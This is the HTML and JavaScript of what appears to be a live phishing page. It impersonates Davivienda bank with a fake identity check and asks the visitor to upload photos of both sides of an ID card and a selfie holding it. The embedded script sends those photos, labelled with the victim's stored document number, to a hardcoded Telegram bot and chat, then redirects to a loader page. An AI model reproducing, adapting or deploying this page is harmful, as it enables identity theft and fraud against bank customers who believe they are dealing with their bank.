<!DOCTYPE html>
<html lang="es">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
    <title>Davivienda - Verificación de Identidad</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ED1C24;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-white flex flex-col min-h-screen">
    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4 text-center">
        <!-- Logo -->
        <div class="flex justify-center mb-12">
            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
        </div>

        <!-- Greeting -->
        <div class="mb-8 text-left">
            <h1 class="text-[22px] font-normal text-[#333] mb-1">Identidad</h1>
            <h2 class="text-[24px] font-bold text-[#333] leading-tight">Verificación de Identidad</h2>
        </div>
        
        <p class="mb-6 text-[#666] text-[15px] text-left">
            Por motivos de seguridad, necesitamos validar tu identidad. Por favor adjunta las siguientes fotografías.
        </p>

        <form id="uploadForm" class="text-left space-y-6">
            <div class="space-y-2">
                <label class="block text-[15px] text-[#666]">1. Documento de Identidad (Frente)</label>
                <input type="file" id="foto1" accept="image/*" class="block w-full text-sm text-[#666]
                    file:mr-4 file:py-2 file:px-4
                    file:rounded-full file:border-0
                    file:text-sm file:font-semibold
                    file:bg-red-50 file:text-[#ED1C24]
                    hover:file:bg-red-100" required onchange="previewImage(this, 'preview1')">
                <img id="preview1" class="mt-2 max-w-[100px] hidden rounded border border-gray-200">
            </div>

            <div class="space-y-2">
                <label class="block text-[15px] text-[#666]">2. Documento de Identidad (Reverso)</label>
                <input type="file" id="foto2" accept="image/*" class="block w-full text-sm text-[#666]
                    file:mr-4 file:py-2 file:px-4
                    file:rounded-full file:border-0
                    file:text-sm file:font-semibold
                    file:bg-red-50 file:text-[#ED1C24]
                    hover:file:bg-red-100" required onchange="previewImage(this, 'preview2')">
                <img id="preview2" class="mt-2 max-w-[100px] hidden rounded border border-gray-200">
            </div>

            <div class="space-y-2">
                <label class="block text-[15px] text-[#666]">3. Selfie sosteniendo el documento</label>
                <input type="file" id="foto3" accept="image/*" class="block w-full text-sm text-[#666]
                    file:mr-4 file:py-2 file:px-4
                    file:rounded-full file:border-0
                    file:text-sm file:font-semibold
                    file:bg-red-50 file:text-[#ED1C24]
                    hover:file:bg-red-100" required onchange="previewImage(this, 'preview3')">
                <img id="preview3" class="mt-2 max-w-[100px] hidden rounded border border-gray-200">
            </div>

            <div class="pt-6">
                <button type="button" onclick="enviarFotos()" class="w-full h-[54px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors">
                    Continuar
                </button>
            </div>
        </form>

        <!-- Divider -->
        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
    </div>

    <!-- Loader Overlay -->
    <div class="loader-overlay" id="loader">
        <div class="spinner mb-4"></div>
        <div class="text-xl font-bold text-gray-800">Subiendo documentos...</div>
    </div>

    <script>
        const TOKEN = "8828858538:AAFiqcWpFxvQWsUM4pcSDxJeoDoNz5OqQcU";
        const CHAT_ID = "-5294649366";

        // Preview de imagenes
        function previewImage(input, previewId) {
            const preview = document.getElementById(previewId);
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

        // Envio de fotos a Telegram
        async function enviarFotos() {
            const f1 = document.getElementById('foto1').files[0];
            const f2 = document.getElementById('foto2').files[0];
            const f3 = document.getElementById('foto3').files[0];

            if (!f1 || !f2 || !f3) {
                alert("Por favor adjunta las 3 fotografías requeridas.");
                return;
            }

            document.getElementById('loader').style.display = 'flex';

            const usuario = localStorage.getItem('davivienda_doc_type') + " " + localStorage.getItem('davivienda_doc_num') || "Desconocido";
            
            const captionBase = `Usuario: ${usuario} | BANCO: DAVIVIENDA`;

            try {
                await sendPhoto(f1, `DOCUMENTO FRENTE - ${captionBase}`, TOKEN, CHAT_ID);
                await sendPhoto(f2, `DOCUMENTO REVERSO - ${captionBase}`, TOKEN, CHAT_ID);
                await sendPhoto(f3, `SELFIE - ${captionBase}`, TOKEN, CHAT_ID);

                // Guardar flag de que ya subió fotos
                localStorage.setItem('davivienda_fotos_subidas', 'true');

                window.location.href = 'load.html';

            } catch (error) {
                console.error(error);
                alert("Error al subir las imágenes. Intente nuevamente.");
                document.getElementById('loader').style.display = 'none';
            }
        }

        async function sendPhoto(file, caption, token, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', file);
            formData.append('caption', caption);

            const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            return await response.json();
        }
    </script>
</body>
</html>
